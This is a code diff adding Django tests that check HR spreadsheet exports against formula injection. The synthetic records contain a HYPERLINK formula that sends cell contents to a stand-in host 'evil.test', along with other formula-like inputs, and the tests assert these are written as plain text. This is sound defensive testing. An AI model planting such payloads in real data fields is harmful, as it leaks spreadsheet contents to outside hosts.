@@ -4,7 +4,7 @@ Un test per chiave registrata: la spec esiste nel registry e
 ``build_export_response`` produce XLSX e PDF con le righe attese.
 Tutti i dati sono sintetici.
 """
-from datetime import date, timedelta
+from datetime import date, datetime, timedelta
 
 from django.contrib.auth import get_user_model
 from django.test import TestCase
@@ -281,3 +281,144 @@ class VisiteMedicheExportTests(ExportHRTestCase):
         self.assertEqual(row["mancanti"], 1)
         self.assertEqual(row["scadute"], 1)
         self.assertEqual(row["valide"], 1)      # la visita di Bianchi è valida
+
+
+class XlsxFormulaInjectionExportTests(ExportHRTestCase):
+    """Formula injection negli export .xlsx HR scritti direttamente con openpyxl
+    (ratei, retribuzioni globali/dipendente, visite mediche).
+
+    Nomi, reparti, voci retributive, tipi visita e prescrizioni sono testo libero:
+    openpyxl scriverebbe come formula viva ('f') qualunque stringa che inizia con
+    "=" (o + - @), valutata all'apertura in Excel. Devono restare testo.
+    Tutti i dati sono sintetici.
+    """
+
+    EVIL = '=HYPERLINK("http://evil.test?d="&A2,"clicca")'
+    CF_EVIL = "VLNEVL90A01H501Z"
+
+    @classmethod
+    def setUpTestData(cls):
+        super().setUpTestData()
+
+        # dipendente con cognome malevolo (finisce in "Dipendente" negli export)
+        cls.dip_evil = AnagraficaDipendente.objects.create(
+            nome="Test", cognome=cls.EVIL, reparto="@SUM(A1)"
+        )
+        DipendenteAnagraficaCivile.objects.create(
+            legacy_anagrafica_id=cls.dip_evil.id, codice_fiscale=cls.CF_EVIL, genere="M"
+        )
+
+        imp = ImportazioneCedolini.objects.create(data_competenza=date(2026, 6, 30))
+        SaldoCedolino.objects.create(
+            importazione=imp, tax_code=cls.CF_EVIL, legacy_anagrafica_id=cls.dip_evil.id,
+            data_competenza=date(2026, 6, 30), anzianita_anni=1,
+            ferie_residui=12, rol_residui=3, ex_fest_residui=1,
+        )
+
+        imp_retr = ImportazioneRetributiva.objects.create(data_competenza=date(2026, 6, 1))
+        VoceRetributiva.objects.create(
+            importazione=imp_retr, tax_code=cls.CF_EVIL,
+            legacy_anagrafica_id=cls.dip_evil.id, data_competenza=date(2026, 6, 1),
+            pay_item=cls.EVIL, pay_item_key="evil_item",
+            categoria=VoceRetributiva.CAT_FISSO, importo=1000,
+        )
+
+        cls.tipo_evil = TipoVisitaMedica.objects.create(
+            nome=cls.EVIL, durata_mesi=12, obbligatoria=True
+        )
+        # NB: `VisitaMedica.save()` RICALCOLA la scadenza (data_svolgimento +
+        # durata_mesi del tipo): passarla esplicitamente non ha effetto. Per farla
+        # cadere nella finestra dell'export scadenze (60 giorni) si retrodata la
+        # visita di ~11 mesi rispetto a una durata di 12.
+        VisitaMedica.objects.create(
+            legacy_anagrafica_id=cls.dip_evil.id, tipo=cls.tipo_evil,
+            data_svolgimento=timezone.localdate() - timedelta(days=340),
+            prescrizioni="+1+1",
+        )
+
+    def _xlsx(self, url_name, *args):
+        self.client.force_login(self.admin)
+        resp = self.client.get(reverse(f"anagrafica:{url_name}", args=args))
+        self.assertEqual(resp.status_code, 200)
+        self.assertEqual(resp["Content-Type"], XLSX_CT)
+        return resp
+
+    def _assert_no_live_formula(self, resp):
+        from io import BytesIO
+
+        from openpyxl import load_workbook
+
+        wb = load_workbook(BytesIO(resp.content))
+        try:
+            found = False
+            for ws in wb.worksheets:
+                for row in ws.iter_rows():
+                    for cell in row:
+                        self.assertNotEqual(
+                            cell.data_type, "f",
+                            f"{ws.title}!{cell.coordinate} = {cell.value!r} scritta come formula",
+                        )
+                        if isinstance(cell.value, str) and cell.value.startswith(self.EVIL):
+                            found = True
+                            self.assertTrue(cell.quotePrefix, f"{ws.title}!{cell.coordinate}")
+            self.assertTrue(found, "il valore malevolo non e' presente nell'export")
+        finally:
+            wb.close()
+
+    def test_ratei_export_non_produce_formule(self):
+        self._assert_no_live_formula(self._xlsx("ratei_export"))
+
+    def test_visite_scadenze_export_non_produce_formule(self):
+        self._assert_no_live_formula(self._xlsx("visite_mediche_export_scadenze"))
+
+    def test_visite_copertura_export_non_produce_formule(self):
+        self._assert_no_live_formula(self._xlsx("visite_mediche_export_copertura"))
+
+    def test_retribuzioni_globale_export_non_produce_formule(self):
+        self._assert_no_live_formula(self._xlsx("retribuzioni_globale_export"))
+
+    def test_dipendente_retribuzioni_export_non_produce_formule(self):
+        self._assert_no_live_formula(
+            self._xlsx("dipendente_retribuzioni_export_xlsx", self.dip_evil.id)
+        )
+
+    def test_ratei_export_mantiene_valori_tipizzati(self):
+        """Non-regressione: intestazioni, testo e numeri restano come prima."""
+        from io import BytesIO
+
+        from openpyxl import load_workbook
+
+        resp = self._xlsx("ratei_export")
+        wb = load_workbook(BytesIO(resp.content))
+        try:
+            ws = wb["Ratei Ferie"]
+            self.assertEqual(ws["A1"].value, "Dipendente")
+            self.assertEqual(ws["E2"].value, "Anni Prec.")
+            # Rossi ha due periodi (maggio 40, aprile 32) e l'export ordina per
+            # -data_competenza: la prima riga è quella di maggio.
+            riga_rossi = next(
+                r for r in ws.iter_rows(min_row=3) if r[0].value == "Rossi Mario"
+            )
+            self.assertEqual(riga_rossi[0].data_type, "s")
+            self.assertFalse(riga_rossi[0].quotePrefix)  # valore benigno intatto
+            self.assertEqual(riga_rossi[7].value, 40)  # ferie residue: numero
+            self.assertEqual(riga_rossi[7].data_type, "n")
+        finally:
+            wb.close()
+
+    def test_dipendente_retribuzioni_export_mantiene_date_e_importi(self):
+        from io import BytesIO
+
+        from openpyxl import load_workbook
+
+        resp = self._xlsx("dipendente_retribuzioni_export_xlsx", self.dip_rossi.id)
+        wb = load_workbook(BytesIO(resp.content))
+        try:
+            ws = wb["Storico retributivo"]
+            self.assertEqual(ws["A1"].value, "Data retribuzione")
+            self.assertEqual(ws["A2"].value, datetime(2026, 5, 1))  # data tipizzata
+            self.assertEqual(ws["A2"].number_format, "DD/MM/YYYY")
+            importi = [c.value for c in ws[2][1:] if c.value is not None]
+            self.assertIn(1500.0, importi)  # importo numerico
+        finally:
+            wb.close()
